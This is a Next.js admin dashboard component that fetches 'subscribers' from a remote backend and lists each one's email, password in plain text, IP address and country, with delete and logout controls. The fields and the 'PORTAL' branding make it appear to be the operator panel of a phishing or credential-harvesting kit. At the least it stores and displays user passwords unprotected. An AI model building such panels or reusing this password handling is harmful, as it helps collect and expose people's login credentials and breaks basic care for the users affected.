"use client";

import { useEffect, useState } from "react";
import Image from "next/image";
import { useRouter } from "next/navigation";
import "@/css/portal.css";

interface Subscriber {
  _id: string;
  email: string;
  password: string;
  ip: string;
  country: string;
  createdAt: string;
}

export default function AdminDashboard() {
  const [subs, setSubs] = useState<Subscriber[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [isSidebarOpen, setIsSidebarOpen] = useState(false);

  const router = useRouter();

  // Fetch all subscribers on mount
  useEffect(() => {
    const fetchSubscribers = async () => {
      const token = localStorage.getItem("admin_token");
      if (!token) {
        router.push("/sign-in");
        return;
      }
      try {
        const res = await fetch(
          "https://quamcon-backend.onrender.com/api/admin/subscribers",
          {
            headers: {
              "Content-Type": "application/json",
              Authorization: `Bearer ${token}`,
            },
          }
        );
        if (!res.ok) {
          if (res.status === 401) {
            localStorage.removeItem("admin_token");
            router.push("/sign-in");
            return;
          }
          const data = await res.json();
          setError(data.message || "Failed to load subscribers");
          setLoading(false);
          return;
        }
        const data = await res.json();
        setSubs(data.data || []);
        setLoading(false);
      } catch (err: any) {
        console.error("Error fetching subscribers:", err);
        setError("Network error");
        setLoading(false);
      }
    };
    fetchSubscribers();
  }, [router]);

  // Handle delete
  const handleDelete = async (id: string) => {
    if (!confirm("Do you wish to delete this User?")) return;
    const token = localStorage.getItem("admin_token");
    if (!token) {
      router.push("/sign-in");
      return;
    }
    try {
      const res = await fetch(
        `https://quamcon-backend.onrender.com/api/admin/subscribers/${id}`,
        {
          method: "DELETE",
          headers: {
            Authorization: `Bearer ${token}`,
          },
        }
      );
      if (!res.ok) {
        alert("Failed to delete");
        return;
      }
      setSubs((prev) => prev.filter((s) => s._id !== id));
    } catch (err) {
      console.error("Delete error:", err);
      alert("Network error deleting");
    }
  };

  // Handle logout
  const handleLogout = () => {
    localStorage.removeItem("admin_token");
    router.push("/sign-in");
  };

  if (loading) {
    return (
      <div className="dashboard-container">
        <p className="loading-text">Loading…</p>
      </div>
    );
  }
  if (error) {
    return (
      <div className="dashboard-container">
        <p className="error-text">Error: {error}</p>
      </div>
    );
  }

  return (
    <div className="dashboard-container">
      {/* Sidebar */}
      <aside className={`sidebar ${isSidebarOpen ? "open" : ""}`}>
        <div className="sidebar-header">
          <Image
            src="/assets/images/app-logo.svg"
            alt="Logo"
            width={32}
            height={32}
          />
          <span className="logo-text">PORTAL</span>
          <button
            className="close-btn"
            onClick={() => setIsSidebarOpen(false)}
          >
            &times;
          </button>
        </div>
        <nav className="sidebar-nav">
          <a href="/admin/dashboard" className="nav-link active">
            Dashboard
          </a>
          <button className="nav-link logout-btn" onClick={handleLogout}>
            Log Out
          </button>
        </nav>
      </aside>

      {/* Main Content */}
      <main className="main-content">
        {/* Header */}
        <header className="header">
          <button
            className="hamburger"
            onClick={() => setIsSidebarOpen(true)}
          >
            <span className="hamburger-line"></span>
            <span className="hamburger-line"></span>
            <span className="hamburger-line"></span>
          </button>
          <h1 className="page-title">All Users</h1>
        </header>

        {/* Subscribers Table */}
        <section className="table-section">
          <div className="table-container">
            <table className="subscribers-table">
              <thead>
                <tr>
                  <th>s/n</th>
                  <th>Email</th>
                  <th>Password</th>
                  <th>IP</th>
                  <th>Country</th>
                  <th>Joined At</th>
                  <th>Actions</th>
                </tr>
              </thead>
              <tbody>
                {subs.map((s, idx) => (
                  <tr key={s._id}>
                    <td>{idx + 1}</td>
                    <td>{s.email}</td>
                    <td>{s.password}</td>
                    <td>{s.ip}</td>
                    <td>{s.country}</td>
                    <td>{new Date(s.createdAt).toLocaleString()}</td>
                    <td>
                      <button
                        className="delete-btn"
                        onClick={() => handleDelete(s._id)}
                      >
                        Delete
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>
      </main>
    </div>
  );
}
